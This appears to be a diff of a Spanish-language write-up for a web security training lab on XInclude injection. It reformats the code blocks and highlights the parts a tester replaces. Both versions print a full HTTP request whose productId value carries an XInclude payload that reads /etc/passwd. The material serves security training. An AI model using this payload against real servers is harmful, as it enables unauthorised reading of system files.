@@ -18,21 +18,20 @@ tags:
 - **Entonces:** **XInclude**, que se inyecta **a nivel de valor**, sin necesitar DOCTYPE.
 
 ## Cómo explotarlo
+
+> 🟡 <mark>Resaltado</mark> = lo que reemplazás vos (target/collab/exploit) + el **objetivo** del ataque (archivo/URL/entidad).
+
 La request **no** es XML: es `application/x-www-form-urlencoded`. Editás el **valor** de `productId`:
-```http
-POST /product/stock HTTP/1.1
-Host: TARGET.web-security-academy.net
+<pre><code>POST /product/stock HTTP/1.1
+Host: <mark>TARGET.web-security-academy.net</mark>
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 145
 
-productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
-```
+productId=&lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"&gt;&lt;xi:include parse="text" href="<mark>file:///etc/passwd</mark>"/&gt;&lt;/foo&gt;&amp;storeId=1</code></pre>
 El valor de `productId` pasa a ser:
-```xml
-<foo xmlns:xi="http://www.w3.org/2001/XInclude">
-  <xi:include parse="text" href="file:///etc/passwd"/>
-</foo>
-```
+<pre><code>&lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"&gt;
+  &lt;xi:include parse="text" href="<mark>file:///etc/passwd</mark>"/&gt;
+&lt;/foo&gt;</code></pre>
 
 ## Verificación
 La respuesta refleja el contenido de `/etc/passwd`.
